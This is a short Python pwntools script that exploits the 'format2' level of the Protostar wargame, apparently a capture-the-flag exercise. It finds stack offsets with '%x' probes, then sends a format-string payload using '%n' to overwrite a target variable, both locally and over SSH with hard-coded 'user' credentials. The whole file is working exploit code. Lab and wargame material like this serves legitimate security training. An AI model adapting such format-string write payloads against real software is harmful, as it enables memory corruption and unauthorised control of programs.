#!/usr/bin/env python
from pwn import *
import sys

targetAddr = 0x080496e4     # objdump -t format2 | grep target
e = ELF('./format2')
offset = 4
def getOffsets():

    for i in range(6):
        payload = "AAAABBBB"
        payload += "%%%d$x" % i

        r = process([e.path])
        r.send(payload + "\n")
        response = r.recv(1024)
        print(str(i) +  " => " + response)
        r.close()

def testLocal():
    i = offset
    payload = p32(targetAddr)
    payload += "%60x%4$n"
    r = process([e.path])
    r.send(payload+"\n")
    print(r.recv())
    r.close()


def exploit(ipAddr):
    i = 4     # different than 211 in remote computer
    s = ssh("user", ipAddr, 22, password="user")
    payload = p32(targetAddr)
    payload += "%60x%4$n"
    r = s.run('/opt/protostar/bin/format2')
    r.send(payload + "\n")
    print(r.recv())
    r.close()

if len(sys.argv) < 2:
    print("usage: ./%s <ip>" % sys.argv[0])
elif sys.argv[1] == "offset":
    getOffsets()
elif sys.argv[1] == "local":
    testLocal()
else:
    exploit(sys.argv[1])


